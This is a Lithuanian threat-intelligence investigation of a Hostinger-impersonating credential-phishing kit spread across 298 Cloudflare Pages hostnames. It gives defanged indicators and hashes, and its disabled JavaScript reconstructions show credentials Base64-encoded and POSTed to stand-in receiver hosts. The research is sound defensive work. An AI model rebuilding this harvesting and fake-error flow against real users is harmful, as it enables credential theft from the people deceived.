---
title: "298 Cloudflare Pages task domenai ir vienas stabilus phishing kit'as"
card_title: "Hostinger imitavimo infrastruktūra: 298 Pages task domenai"
description: "Ilgas Hostinger tematika sukurto credential-harvesting kit'o tyrimas: klonuota sąsaja, tikslus JavaScript reuse, automatizuoti Pages projektai, atskiri Render rinktuvai ir ribos tarp kit lineage bei operatoriaus attribution."
seo_title: "Hostinger phishing kampanija: 298 apsimetimo domenai"
seo_keywords:
  - "Hostinger phishing kampanija"
  - "Hostinger apsimetimo domenai"
  - "credential harvesting"
  - "phishing kit analizė"
  - "Cloudflare Pages phishing"
date: 2026-08-27 08:00:00 +0300
last_modified_at: 2026-08-27 08:30:00 +0300
last_reviewed_at: 2026-08-27 08:30:00 +0300
lang: lt
translation_key: hostinger-pages-phishing-infrastructure
permalink: /lt/tyrimai/hostinger-pages-phishing-infrastrukturos-tyrimas/
author: deividas-lis
content_type: investigation
categories: [fraud-scams, threat-intelligence, investigations]
tags: [Hostinger, Cloudflare Pages, Render, credential phishing, JavaScript, URLScan, kit reuse]
confidence: high
tlp: clear
research_id: HX-JSO-2026-001
research_version: "1.2"
research_status: published
evidence_basis: "Hash patikrinti archyvuoti dokumentai ir JavaScript, URLScan vieši stebėjimai, statinė kodo analizė, ribotas dabartinės būsenos ir fiksuotų path'ų patikrinimas, vienas isolated-VM stebėjimas bei sanitizuotos agreguotos išvestys."
methods: [static analysis, exact-hash pivoting, URLScan correlation, DNS and TLS validation, bounded HTTP verification, fixed-path response comparison, isolated-VM browser observation, descriptive hostname analysis]
research_bundle: /assets/data/hostinger-pages-phishing-2026/README.md
scope: "Hostinger tematika sukurto credential-harvesting kit'o statinė analizė, URLScan istorinių stebėjimų koreliacija, riboti neinteraktyvūs infrastruktūros ir fixed-path patikrinimai, vienas fiksuotų archyvų vardų negative check bei vėlesnis isolated-VM spot check be formos pateikimo."
limitations: "Tyrimas nenustato aukų skaičiaus, sėkmingų prisijungimo duomenų pateikimų, tikslaus hostname generatoriaus, vieno operatoriaus ar Hostinger sistemų kompromitavimo. Joks valid kit'o archyvas nebuvo gautas. Manual VM patikrinimas neišsaugojo HAR, todėl automatinio tracker kontakto ir tikslios path-dependent browser elgsenos priežasties atkurti negalima. URLScan skaičiai yra skenavimo stebėjimai, ne aukos."
key_findings:
  - "Tikslus credential-harvesting JavaScript hash matomas 467 URLScan stebėjimuose, 262 task domenuose nuo 2025-12-23 iki 2026-08-23."
  - "Ilgo Hostinger Pages hostname šablono paieška davė 562 stebėjimus ir 298 atskirus task domenus nuo 2026-03-25 iki 2026-08-23."
  - "2026-08-24 penki iš aštuonių deterministiškai parinktų Pages hostų vis dar pateikė tiksliai tą patį kenksmingą dokumentą ir tris žinomus script'us."
  - "Kodas iki dviejų kartų nuskaito ir Base64 užkoduoja vartotojo vardą bei slaptažodį, parodo tą pačią netikrą klaidą ir galiausiai nukreipia į teisėtą Hostinger Mail."
  - "Exact hostname task paieška grąžino 298 vardus, o kitų vietinių pivot'ų final-page laukuose rastas dar vienas to paties šablono vardas; pilnas vietinis family union yra 299."
  - "Atskiras hash-gated patikrinimas penkiuose exact-content hostuose nerado nė vieno valid ZIP archyvo: 25 fiksuoti candidate path'ai grąžino HTML."
  - "Vėlesniame vieno hosto fixed-path patikrinime devyni iš dešimties fiksuotų path'ų grąžino tikslų root dokumentą, todėl path-dependent browser elgsena gerai dera su Cloudflare Pages SPA fallback."
  - "Bendri parametrų vardai ir infrastruktūra rodo platesnę kit'o ar builder'io lineage, bet neįrodo, kad visus deployment'us valdė vienas žmogus ar grupė."
image:
  path: /assets/img/posts/2026-08-24-hostinger-pages-phishing/hostinger-pages-phishing-hero.svg
  thumbnail: /assets/img/posts/2026-08-24-hostinger-pages-phishing/hostinger-pages-phishing-hero.svg
  social: /assets/img/social/hostinger-pages-phishing-infrastructure-lt.png
  alt: "Hostinger imitavimo phishing kit'o srautas nuo Cloudflare Pages puslapio iki atskirų credential bei tracking servisų ir teisėto Hostinger redirect"
  width: 1600
  height: 900
featured: false
draft: false
published: true
toc: true
prose_width: wide
comments: false
---

## Trumpai: tyrimas nerodo Hostinger kompromitavimo, bet jo login puslapis gavo labai prastą dvynuką

Tyrimo pradžia buvo gan kasdieniška. Vietiniame JavaScript observatory rinkinyje pasirodė keli <code>pages.dev</code> hostai, kurių pavadinimai atrodė lyg kažkas būtų paėmęs Hostinger, atsitiktinių raidžių generatorių ir per daug laisvo laiko:

~~~text
hostinger-mail-ewgjnwrkgnkrw-<24 mažosios raidės>.pages.dev
~~~

Vienas toks domenas dar galėtų būti eilinis phishing puslapis. Problema ta, kad vienas labai greitai tapo 25, tada 298, o po HTML ir JavaScript palyginimo paaiškėjo, kad čia ne vien vizualiai panašūs klonai. Tarp deployment'ų kartojosi tas pats credential-harvesting kodas, tas pats UI bundle, tie patys formos laukai, ta pati netikros klaidos logika ir atskiri Render servisai credentials bei tracking duomenims.

Kitaip tariant, puslapio vardai sukosi kaip vienkartiniai numeriai, bet po jais esantis mechanizmas buvo stebėtinai stabilus. Phishing infrastruktūroje tai nėra romantika. Tai tiesiog normaliai veikianti deployment pipeline, tik produkto roadmap'e vietoje "improve onboarding" yra "surinkti dar vieną slaptažodį".

Svarbiausia išvada iškart:

- Hostinger šioje istorijoje yra **imituojamas brand'as**, o turimi duomenys nerodo jo sistemų kompromitavimo;
- Cloudflare Pages ir Render yra paslaugų platformos, ne priskirti kampanijos dalyviai;
- archyvuotas kodas aukštu confidence lygiu rodo credential collection elgseną;
- 562 ar 467 URLScan įrašai **nėra aukos, apsilankymai ar sėkmingi credentials pateikimai**;
- code reuse leidžia kalbėti apie kit'o lineage, bet ne apie vieną žmogų, šalį ar threat actor;
- jokie credentials nebuvo pateikti ir credential receiver nebuvo kontaktuotas. Statinės analizės bei automatizuoto rinkimo metu campaign JavaScript nebuvo vykdomas ir nebuvo kontaktuotas nė vienas Render endpoint. Vėlesniame isolated-VM spot check puslapis buvo renderintas be formos duomenų, bet neišsaugotas HAR, todėl automatinio tracker kontakto atmesti negalima;
- penkiuose exact-content hostuose buvo atliktas atskiras 30 GET ribos patikrinimas, tačiau nė vienas iš 25 fiksuotų ZIP path'ų nepateikė valid archyvo.

## Esminės išvados

| Klausimas | Atsakymas | Confidence |
| --- | --- | --- |
| Ar tai credential phishing? | Taip. Kodas skaito username ir password, Base64 užkoduoja juos ir paruošia POST į atskirą rinktuvą. | High |
| Ar klonai buvo vien tik istorija? | Ne. 2026-08-24 penki iš aštuonių ribotai patikrintų hostų pateikė tikslų žinomą dokumentą ir visus tris script'us. | High ribotam sample |
| Ar deployment'ų vardai automatizuoti? | 24 raidžių suffix'ai yra fiksuoto ilgio, unikalūs ir beveik maksimalaus entropijos lygio. Tai labai gerai dera su deployment-name generatoriumi, bet neatskleidžia konkretaus RNG, seed'o ar kalbos. | High automatizacijai, Unknown implementacijai |
| Ar buvo rastas viešai paliktas kit'o ZIP? | Ne. Penki vardai penkiuose exact hostuose davė 25 HTML response ir nulį struktūriškai validžių ZIP. Tai siauras negative result, ne visų galimų path'ų paneigimas. | High tik patikrintam scope |
| Ar visi 298 hostai buvo aktyvūs vienu metu? | Nenustatyta. DNS rezoliucija nėra turinio būsenos įrodymas, o tiesioginis sample buvo tik aštuonių hostų. | Unknown |
| Ar visi hostai priklauso vienam operatoriui? | Nenustatyta. Vienodo deployment modelio požymiai stiprūs, bet kit'o pardavimas, kopijavimas ar keli klientai lieka realios alternatyvos. | Unknown |
| Ar tyrimas rodo Hostinger kompromitavimą? | Ne. Turimi duomenys rodo išorinį brand'o kopijavimą ir teisėto Hostinger redirect naudojimą. | High šio evidence scope ribose |
| Kiek žmonių nukentėjo? | Nežinoma. Tyrimas neturi victim-side log'ų ar server-side receipts. | Unknown |

## Kaip šitas cluster'is atsirado tyrime

Pradinis duomenų rinkinys buvo lokalus JavaScript Observatory surinkimas. Jame 30 URLScan skenų per 2026 m. rugpjūčio 18-23 d. apėmė 25 skirtingus ilgo Hostinger hostname šablono hostus. Visuose buvo labai panaši dokumento struktūra, o script'ų hash'ai kartojosi.

Tada pivot'as buvo išplėstas dviem kryptimis:

1. pagal visą hostname family;
2. pagal tikslų credential-harvesting JavaScript SHA-256.

Rezultatas:

| Pjūvis | Stebėjimai | Atskiri task domenai | Langas UTC |
| --- | ---: | ---: | --- |
| Vietinis account subset | 30 | 25 | 2026-08-18 iki 2026-08-23 |
| Ilgas hostname family | 562 | 298 | 2026-03-25 iki 2026-08-23 |
| Tikslus harvester script hash | 467 | 262 | 2025-12-23 iki 2026-08-23 |

Šitie skaičiai yra platformos stebėjimai. Vienas hostas gali turėti kelis skenus. Vienas skenas gali būti tyrėjo, automatinės sistemos ar abuse komandos patikrinimas. Skenas nėra žmogus. Dar kartą, nes internete skaičiai mėgsta labai greitai persikvalifikuoti į clickbait: **467 URLScan stebėjimai nėra 467 aukos.**

## Metodika ir saugumo ribos

Šitas tyrimas buvo padalintas į šešis ribotus sluoksnius:

| Sluoksnis | Kas daryta | Kas nedaryta |
| --- | --- | --- |
| Archyvų analizė | URLScan JSON, response body, screenshot, hash ir redirect metadata | Jokio live formos pateikimo |
| Statinė kodo analizė | HTML unwrap, JavaScript string table dekodavimas, formos ir callback'ų rekonstrukcija | Originalus JS nebuvo vykdomas |
| Ribotas dabartinės būsenos patikrinimas | DNS, TLS, HEAD ir inert GET į aštuonių žinomų Pages hostų root; žinomi script path'ai tik penkiems exact-match hostams | Jokio renderinimo, POST, brute force, crawling, recursive path expansion, port scan ar Render endpoint kontakto |
| Fiksuotų archyvų vardų patikrinimas | Penki exact-root hostai, penki iš anksto nustatyti ZIP basename'ai, exact root-hash gate ir struktūrinė ZIP validacija | Jokio bendro wordlist'o, rekursijos, redirect sekimo, formos submit ar receiver kontakto |
| Isolated-VM spot check | Manual browser stebėjimas atidarant bare project URL ir <code>/admin</code>, neįvedant ir nepateikiant jokių duomenų | Jokių credentials, plataus crawl, receiver test ar išsaugoto HAR; tai analyst observation, ne skaičiuojamas measurement |
| Fixed-path response check | Vienas anksčiau hash patvirtintas hostas, root-hash gate ir dešimt iš anksto fiksuotų nuoseklių GET su išjungtais redirect'ais | Jokio browser renderinimo, JavaScript vykdymo, bendro wordlist'o, rekursijos, query string, cookie ar receiver kontakto |

Pradinis HTML buvo procentais užkoduotas dviem sluoksniais. Jis buvo išvyniotas kaip tekstas, ne atidarytas naršyklėje. JavaScript buvo nagrinėjamas baitais ir string table reikšmėmis. Tai svarbu, nes "tik trumpam paleiskim ir pažiūrėkim" yra labai geras būdas paversti tyrimą savu incidentu. Tada dar galima rašyti postmortem'ą apie tai, kaip analyst workstation tapo papildomu IOC. Labai edukaciška, bet šį kartą praleidau.

Tiesioginis dabartinės būsenos patikrinimas buvo atliktas tik tada, kai jau buvo žinomi tikslūs dokumento ir asset'ų hash'ai. Aštuonių hostų pasirinkimas buvo deterministinis: ankstyviausias išsaugotas hostas kiekvienam mėnesiui, naujausias hostas ir dažniausiai stebėtas hostas. Tai suteikė laiko aprėptį, bet **nepadarė sample atsitiktiniu ar statistiškai reprezentatyviu**.

Kiekvienam iš aštuonių hostų buvo atlikta:

- viena TLS sesija;
- vienas <code>HEAD /</code>;
- vienas riboto dydžio <code>GET /</code> be redirect sekimo ir be renderinimo.

Tik penki hostai, kurių root body sutapo su žinomu kenksmingu dokumentu, gavo po vieną inert GET į tris jau archyve nustatytus kelius: <code>/jg.js</code>, <code>/js.js</code> ir <code>/js1.js</code>.

Credential ir tracker Render vardams buvo atlikti tik vieši DNS bei exact-name certificate transparency lookup'ai. HTTP užklausų į juos nebuvo.

Vėliau atskiras vienos paskirties collector'is penkiuose exact-content hostuose atliko penkis root-hash gate GET ir 25 fiksuotų ZIP vardų GET. Šita veikla aprašyta atskirai, nes ji įvyko po pirminio current-state validation ir negali būti paslėpta po patogiu sakiniu "viskas buvo tik pasyvu". Redirect'ai buvo išjungti, request budget buvo 30, o Render receiver'iai liko nekontaktuoti.

## Įrodymų grandinė

Tyrimo išvada nesiremia vien screenshot'u ar automatiniu verdict'u. Ji remiasi keliais nepriklausomai suderintais elementais:

1. URLScan archyvuotas HTML turi username ir password laukus.
2. Submit mygtukas kviečia phishing JavaScript funkciją, ne teisėtą Hostinger backend'ą.
3. Hash patikrintas script'as nuskaito abu laukus.
4. Abi reikšmės užkoduojamos su <code>btoa</code> ir įdedamos į POST laukus.
5. Kode yra atskiras Render destination, ne Hostinger domenas.
6. Success ir error callback'ai rodo tą pačią netikrą klaidą.
7. Po pakartotinių bandymų vartotojas nukreipiamas į teisėtą Hostinger Mail.
8. Trys URLScan screenshot'ai vizualiai patvirtina Hostinger login imitaciją keliomis kalbomis.
9. 2026-08-24 penki žinomi hostai pateikė tuos pačius dokumento ir script'ų baitus.

Vienas signalas galėtų klaidinti. Visi kartu sudaro aukšto confidence credential-harvesting finding'ą.

## Ką matė vartotojas

Puslapis imitavo Hostinger Mail prisijungimą: Hostinger logotipas, email laukas, password laukas, login mygtukas ir lokalizuotas marketingo turinys. Išsaugoti screenshot'ai rodo bent vokišką ir portugališką versijas.

![Anotuotas vokiškas Hostinger phishing puslapio URLScan screenshot'as. Numeriai žymi kopijuotą brand'ą, email ir password laukus, login mygtuką bei lokalizuotą social proof.](/assets/img/posts/2026-08-24-hostinger-pages-phishing/hostinger-login-german-01-lt.png)
_1 pav. Vokiškas URLScan stebėjimas 2026-08-18. Tai sandbox screenshot'as, ne aukos įrenginio ekranas._

![Anotuotas portugališkas Hostinger phishing puslapio URLScan screenshot'as.](/assets/img/posts/2026-08-24-hostinger-pages-phishing/hostinger-login-portuguese-01-lt.png)
_2 pav. Portugališkas variantas 2026-08-19. UI lokalizacija keitėsi, bet kolekcijos mechanizmas liko tas pats._

![Antras anotuotas vokiškas Hostinger phishing puslapio URLScan screenshot'as.](/assets/img/posts/2026-08-24-hostinger-pages-phishing/hostinger-login-german-02-lt.png)
_3 pav. 2026-08-23 stebėjimas. Vizualus panašumas yra corroboration, o kenkėjiška elgsena nustatyta iš kodo._

Screenshot'uose numeriai žymi:

1. kopijuotą Hostinger identitetą;
2. email įvestį;
3. password įvestį;
4. login mygtuką, susietą su rinkimo flow;
5. lokalizuotą marketingo tekstą;
6. kopijuotą social proof elementą.

Vien screenshot'as nepasako, kur keliauja duomenys. Jis parodo apgaulę. Tiksli duomenų kryptis nustatyta iš archyvuoto JavaScript ir request metadata.

## Puslapis nebuvo parašytas nuo nulio

Dekoduotame dokumente liko 37 <code>data-savepage-*</code> atributai ir trys inline SVG data URI. Tai gerai dera su puslapio išsaugojimu naudojant save-page tipo įrankį ir vėlesniu pritaikymu phishing kit'ui.

Tai nėra operatoriaus tapatybė. Save-page likučiai nepasako, kas spaudė "Save". Jie tik padeda suprasti construction workflow:

~~~text
teisėto puslapio kopija
  -> išsaugotas HTML ir CSS bundle
  -> palikti marketingo elementai
  -> įterpti aktyvūs phishing script'ai
  -> deployment į naują Pages projekto vardą
~~~

Kelios originalaus puslapio marketingo integracijos dokumente liko kaip inert <code>text/plain</code> elementai. Tuo metu <code>jg.js</code>, <code>js1.js</code> ir <code>js.js</code> buvo aktyviai įkeliami. Tai svarbi analitinė riba: ne kiekvienas trečiosios šalies domenas HTML'e yra campaign infrastructure. Kai kurie yra tiesiog nukopijuoto puslapio bagažas.

## Formos anatomija

Formos vardas yra <code>login-form</code>. Ji deklaruoja <code>method="post"</code>, bet neturi tikro action. Submit vietoje tiesiogiai kviečiama JavaScript funkcija <code>mary()</code>.

| Paskirtis | Name | ID | Type |
| --- | --- | --- | --- |
| Username | <code>_user</code> | <code>rcmloginuser</code> | <code>text</code> |
| Password | <code>_pass</code> | <code>rcmloginpwd</code> | <code>password</code> |

Roundcube stiliaus ID nėra Hostinger kompromitavimo įrodymas. Tai greičiau rodo, kad klonas perėmė webmail formos konvencijas.

## Personalizavimo parametrai

Core script'as skaito du URL parametrus:

- <code>coztrexx</code>;
- <code>trexxcoz</code>.

Abi reikšmės dekoduojamos iš Base64 ir sujungiamos su <code>@</code>. Taip gaunamas iš anksto užpildytas email adresas. Trečias parametras, <code>trexxx</code>, skaitomas tracker module'yje. Dar vienas vardas, <code>wfIUbh</code>, matomas istoriniuose task URL, bet jo funkcija išsaugotame Hostinger kode nenustatyta.

Originalus failas yra obfuscated ir gerokai triukšmingesnis. Žemiau pateikiamas **normalizuotas semantinis atkūrimas**, ne nukopijuotas campaign source. Destination yra defanged, su UI nesusijęs kodas pašalintas, o navigation funkcija tyčia neegzistuoja, todėl šio fragmento negalima tiesiog įklijuoti į browserį ir paleisti kaip originalaus loader'io:

~~~js
// Normalizuota iš išsaugoto core script'o. Tai nėra vykdomas campaign kodas.
const localPart = decodeBase64(readQuery("coztrexx")); // mailbox tekstas prieš @
const domainPart = decodeBase64(readQuery("trexxcoz")); // mailbox tekstas po @
const mailbox = `${localPart}@${domainPart}`;

if (looksLikeMailbox(mailbox)) {
  prefill("#rcmloginuser", mailbox); // personalizuojama nukopijuota login forma
} else {
  NAVIGATION_DISABLED("hxxps://mail[.]hostinger[.]com/");
  // Trūkstant validžių lure parametrų direct visitor nukreipiamas į legit mail.
}
~~~

Paskutinis branch'as svarbus. Bare project URL nėra pilnas lure. Be validžių personalizavimo reikšmių išsaugotas client-side kodas pats skirtas paslėpti kloną ir palikti lankytoją teisėtame Hostinger Mail.

Pilni task URL ir dekoduoti mailbox local-part'ai šiame tekste nepateikiami. Tai nėra reikalinga elgsenai įrodyti ir tik bereikalingai paviešintų potencialių gavėjų duomenis.

## Credential collection flow

Statiškai atkurtas pagrindinis flow atrodo taip:

~~~text
Lure URL
  |
  +-> Base64(coztrexx) -> mailbox local part
  +-> Base64(trexxcoz) -> mailbox domain part
  +-> sujungimas su "@" -> iš anksto užpildytas username
  |
Login arba Enter
  |
  +-> skaityti #rcmloginuser
  +-> skaityti #rcmloginpwd
  +-> ai = Base64(username)
  +-> pr = Base64(password)
  +-> pg = "Hostinger"
  |
  +-> POST į atskirą Render servisą
  |
  +-> success: "Login failed."
  +-> error:   "Login failed."
  +-> password laukas išvalomas
  |
Antras bandymas
  |
  +-> dar vienas toks pats POST gali būti parengtas
  +-> vartotojas nukreipiamas į teisėtą Hostinger Mail
~~~

![Hostinger kit'o duomenų srautas nuo personalizuoto lure URL iki atskirų credential ir tracker Render servisų bei teisėto Hostinger redirect.](/assets/img/posts/2026-08-24-hostinger-pages-phishing/hostinger-kit-flow.svg)
_4 pav. Statiniu kodu ir išsaugota URLScan metadata pagrįsta flow rekonstrukcija. Diagramoje atskirtas credentials, tracking ir teisėto redirect srautas. Joks originalus campaign POST nebuvo vykdomas._

Request struktūra:

| Savybė | Reikšmė |
| --- | --- |
| Metodas | POST |
| Destination | <code>hxxps://mohamedbinsalm[.]onrender[.]com/</code> |
| Laukai | <code>ai</code>, <code>pr</code>, <code>pg</code> |
| Username | Base64 tekste laukelyje <code>ai</code> |
| Password | Base64 tekste laukelyje <code>pr</code> |
| Brand marker | literalas <code>Hostinger</code> laukelyje <code>pg</code> |
| Tikėtinas content type | <code>application/x-www-form-urlencoded</code> |

Content type yra pagrįsta jQuery <code>$.ajax</code> objektu su paprastu <code>data</code> dictionary ir be content-type override. Kadangi nebuvo atliktas live POST ar gautas server-side receipt, tai yra techniškai pagrįsta inference, ne packet capture faktas.

Credential branch'ą galima sutraukti iki tokios elgsenos. Čia irgi pateikiama defanged rekonstrukcija: transport bei navigation funkcijos neegzistuoja, o tikslus destination lieka evidence lentelėje, ne vykdomame kode.

~~~js
// Normalizuota iš mary(); su forma nesusijęs UI kodas pašalintas.
const payload = {
  ai: encodeBase64(readField("#rcmloginuser")), // įvestas username
  pr: encodeBase64(readField("#rcmloginpwd")),  // įvestas password
  pg: "Hostinger"                               // nukopijuoto brand'o marker'is
};

POST_DISABLED("hxxps://credential-receiver[.]invalid/", payload);

function afterEitherTransportOutcome() {
  showMessage("Login failed."); // success ir error vartotojui atrodo vienodai
  clearField("#rcmloginpwd");
  hiddenAttemptCounter += 1;

  if (hiddenAttemptCounter > 2) {
    NAVIGATION_DISABLED("hxxps://mail[.]hostinger[.]com/");
    // Po retry vartotojas išvedamas į legit servisą.
  }
}
~~~

Ir taip, Base64 nėra encryption. Tai nėra slaptas kibernetinis tunelis. Tai tiesiog kitas tekstinis atvaizdavimas, kurio paskirtis greičiausiai yra apsunkinti labai paviršutinišką peržiūrą. <code>YWJj</code> vis dar yra <code>abc</code>, tik su kostiumu.

## Netikra klaida nėra klaida

Success ir error callback'ų turinys po normalizavimo sutampa. Nesvarbu, ar užklausa pavyktų, ar nepavyktų, vartotojui rodoma <code>Login failed.</code>, mygtukas atstatomas, password laukas išvalomas ir paliekama galimybė bandyti dar kartą.

Vidinis counter'is pradeda nuo vieneto. Pirmas callback'as jį padidina iki dviejų. Antras bandymas pakelia apskaičiuotą reikšmę iki trijų ir inicijuoja teisėtą Hostinger Mail redirect'ą.

Tai leidžia kit'ui:

- inicijuoti iki dviejų POST su credential poromis, jei vartotojas bando pakartotinai;
- sukurti jausmą, kad pirmas password buvo tiesiog neteisingas;
- po visko nuvesti vartotoją į tikrą puslapį, kur jis gali pagalvoti, kad sistema tiesiog susitvarkė.

Dark pattern'as labai paprastas. Pirma išsiunčiam pirmą credential bandymą, tada dar kartą paprašom "patikrinti slaptažodį", o pabaigoje parodom tikrą svetainę. Customer journey beveik idealus, jeigu customer yra nusikaltėlis.

## Tracker yra atskiras modulis

<code>js1.js</code> nerenka username ir password. Jis skaito <code>trexxx</code> parametrą ir, kai jis pateiktas, POST laukelyje <code>trex</code> siunčia jį į atskirą Render servisą. Kai parametro nėra, kodas gali nukreipti į Hostinger pagalbos puslapį nepateikdamas tracker request'o.

~~~js
// Normalizuotas tracker module. Network ir navigation funkcijos išjungtos.
const lureToken = readQuery("trexxx");

if (lureToken) {
  POST_DISABLED("hxxps://tracker-receiver[.]invalid/", { trex: lureToken });
  // Campaign token siunčiamas atskirai nuo username ar password.
} else {
  NAVIGATION_DISABLED("hxxps://support[.]hostinger[.]com/");
  // Direct visit be laukiamo token gali būti išvestas iš klono.
}
~~~

Išsaugotos dvi tracker versijos:

| Versija | SHA-256 | Tikslus hash langas | URLScan stebėjimai | Destination |
| --- | --- | --- | ---: | --- |
| Legacy | <code>b4f03187184e98f148b8fce890a35849a41f86aff938965138bf8a2346cf7d10</code> | 2026-03-25 iki 2026-04-14 | 13 | <code>hxxps://wfrgbfchkp[.]onrender[.]com/</code> |
| Current | <code>563824f1917c8b2be9d54cc5b3c5dbcfd1b8cc9198039a3f54fe705d08ee6d5d</code> | 2026-04-21 iki 2026-08-23 | 452 | <code>hxxps://moyin-psp-12012026[.]onrender[.]com/</code> |

Iš 25 dekoduotos string table pozicijų 24 yra tokios pačios. Skiriasi tracker destination. Normalizavus endpoint'ą, generatoriaus sukurtus variable vardus ir vieną <code>const</code> bei <code>var</code> skirtumą, programos struktūra sutampa.

Tai yra stiprus version lineage ryšys. Tai vis dar nėra žmogaus attribution.

## Localhost-only request rekonstrukcija

Kad request struktūra nebūtų vien piešinys ant lentos, buvo sukurtas atskiras saugus testas. Jis **nevykdo originalaus JavaScript**, nepriima savavališko destination ir gali kreiptis tik į laikiną HTTP serverį, pririštą prie <code>127.0.0.1</code>.

Vienas sintetinis request'as naudojo tik built-in testines reikšmes:

| Laukas | Lokali testinė reikšmė |
| --- | --- |
| <code>ai</code> | Base64 fiktyvaus <code>.invalid</code> mailbox atvaizdavimas |
| <code>pr</code> | Base64 frazės <code>not-a-real-password</code> atvaizdavimas |
| <code>pg</code> | <code>Hostinger</code> |

Loopback receiver užfiksavo:

- metodą <code>POST</code>;
- path <code>/capture</code>;
- content type <code>application/x-www-form-urlencoded</code>;
- laukus <code>ai</code>, <code>pg</code> ir <code>pr</code>;
- body SHA-256 <code>2be964d49ba7e211ac4c4246cf40c66b1d107f7c7c29f95dab10bf93bfc34392</code>.

Originalus campaign destination nebuvo kontaktuotas. Šitas testas neįrodo, kad remote receiver priima ar saugo duomenis. Jis įrodo, kad statinė request interpretacija gali būti atkartota lokaliai, nepaliekant fake credentials svetimoje sistemoje ir nesugadinant provider'io log'ų.

## Anti-inspection: daugiau teatro nei apsaugos

<code>jg.js</code> blokuoja context menu bei kelis shortcut'us, tarp jų <code>Ctrl+S</code>, <code>Ctrl+C</code> ir <code>Ctrl+U</code> variantus.

~~~js
// Supaprastinta iš jg.js: reprezentatyvi elgsena, ne pernaudojamas source.
blockBrowserAction("contextmenu");
blockBrowserShortcut("Ctrl+S"); // trukdyti Save Page
blockBrowserShortcut("Ctrl+C"); // trukdyti kopijuoti matomą tekstą
blockBrowserShortcut("Ctrl+U"); // trukdyti View Source
~~~

Tai nėra rimtas anti-analysis sluoksnis. Tai friction vartotojui arba mažiau patyrusiam tyrėjui. HTTP response galima išsaugoti nepaspaudus <code>Ctrl+S</code>, o source galima perskaityti nenaudojant context menu. Browserio mygtukų blokavimas yra apsauga maždaug kaip užrašas "nežiūrėti" ant atidaryto stalčiaus.

Jo exact hash URLScan paieškoje buvo nurodytas 5 079 stebėjimuose, iš kurių API grąžino 1 000. Grąžintas rinkinys apėmė Hostinger, Microsoft, GoDaddy, Adobe, DHL, Naver, one.com ir kitus lure'us.

Todėl anti-inspection hash yra **generic contextual signal**. Alert'inti vien pagal jį būtų patikimas būdas SOC komandai pagaminti daug bilietų ir labai mažai intelligence.

## Exact hash reuse

Pagrindinio credential-harvesting script'o SHA-256:

~~~text
9805613dfd2c4b09e3080d0fabbfb8476efff9cd57775481df5a523922b311c2
~~~

Jis matomas 467 grąžintuose URLScan stebėjimuose per 262 task domenus nuo 2025-12-23 iki 2026-08-23.

Iš jų:

- 465 task'ai prasidėjo Cloudflare Pages deployment'uose;
- vienas task'as prasidėjo per <code>is[.]gd</code> shortener'į;
- vienas task'as prasidėjo per <code>rb[.]gy</code> shortener'į.

Ilgo Hostinger hostname family ir exact core persidengimas apima 462 stebėjimus. Likę penki yra du shortener task'ai ir trys Pages task'ai už tikslaus ilgo prefix pivot'o ribų.

Kitoje pusėje 100 iš 562 ilgo hostname family stebėjimų neturėjo grąžinto exact core hash. Ten buvo blocked, unavailable, redirected ar kitokia versija. Todėl negalima tiesiog pasakyti, kad visi 562 skenai pateikė vieną ir tą patį payload'ą.

Pairwise persidengimai:

| Poros | Exact overlap | Vertinimas |
| --- | ---: | --- |
| Core harvester + current tracker | 451 | Dominuojantis dabartinis bundle |
| Core harvester + legacy tracker | 13 | Ankstesnis bundle |
| Latest document + core harvester | 100 iš 100 grąžintų dokumentų | Version-specific dokumentas stabiliai turėjo core |
| Hostname family + core harvester | 462 | Stiprus prefix ir elgsenos ryšys |

Latest document paieška reportino 128 rezultatus, bet grąžino tik 100. Tie 100 sutapo su core, bet jie nėra pilna 128 populiacija. Truncated API response nėra dingusių 28 įrašų telepatinė analizė.

## Stabilus UI bundle ir modulinis atnaujinimas

Šeši pilni istoriniai URLScan rezultatai nuo 2026 m. kovo 25 d. iki liepos 2 d. turėjo tikslų core script'ą. Visuose šešiuose sutapo septyni origin resursai:

| Resursas | SHA-256 |
| --- | --- |
| <code>bootstrap.min.css</code> | <code>3cb5b7ae5053d743996378c35733560214d3d896ade5c0de0d8b13a97f43039e</code> |
| <code>icon.css</code> | <code>9025083b82c99e90f30aef3da6df3ba78762c251af8adb3a7fc34324d7945e42</code> |
| <code>styles.css</code> | <code>7ffb84ddd0ec7dbf0f83ccae4c3711db0c16197eb9fa240170dad9228117de77</code> |
| <code>elastic.css</code> | <code>c41741609bd915ed563c8ac0360d00baeecee2f72c86d630ed4fe672b5ffa7c4</code> |
| <code>jquery-ui.min.css</code> | <code>f5b5a77ef82bdf524e8536ba04f44331eeb23d96edd884b6c9aa8520d4956df2</code> |
| <code>jg.js</code> | <code>9201f2ee02b6b642504b09f95e61a57a2bcff43e23c7d737473229e2e4f7d503</code> |
| <code>js.js</code> | <code>9805613dfd2c4b09e3080d0fabbfb8476efff9cd57775481df5a523922b311c2</code> |

Tracker yra modulis, kuris pasikeitė, o credential harvester ir UI liko stabilūs. Tai labiau primena prižiūrimą paketą nei kiekvieną kartą nuo nulio sulipdytą puslapį.

Vienas rugpjūčio mėnesio pilnas rezultatas rodė Cloudflare 522 puslapį ir neturėjo žinomų kit'o resursų. Jis teisingai neįtrauktas į stable bundle išvadą. Kai puslapis neatsako, negalima iš neegzistuojančio response padaryti išvadą, kad jame buvo tie patys failai. Akivaizdu, bet IOC skaičiavimuose tokia detalė kartais paslaptingai dingsta.

## Laiko juosta

| Data UTC | Stebėjimas | Ką tai leidžia teigti |
| --- | --- | --- |
| 2024-01-11 | Ankstyviausias išsaugotas legacy tracker endpoint stebėjimas platesnėje cross-brand ekosistemoje | Tracker infrastruktūra ar jos konvencija egzistavo anksčiau už Hostinger hostname family |
| 2025-07-24 | Viešas Excel/PDF tematikos Pages stebėjimas turi tą patį ilgą path ir keturių parametrų gramatiką | Implementation grammar naudota bent nuo 2025 m. liepos |
| 2025-12-23 | Ankstyviausias tikslus Hostinger credential-harvester script hash | Core kodas yra senesnis už ilgą dabartinį hostname prefix'ą |
| 2026-03-25 | Ankstyviausias išsaugotas ilgo Hostinger hostname family stebėjimas | Prasideda dokumentuotas dabartinio deployment modelio langas |
| 2026-04-14 | Short-link skene final page lauke matomas dar vienas ilgo family vardas, nepatekęs į exact task-domain query | Vietinis cross-pivot union yra 299, nors task-domain query grąžino 298 |
| 2026-03-25 iki 2026-04-14 | Matomas legacy tracker hash | Ankstesnė tracker versija |
| 2026-04-21 | Ankstyviausias išsaugotas current tracker hash | Endpoint'o pakeitimas nekeičiant pagrindinės flow logikos |
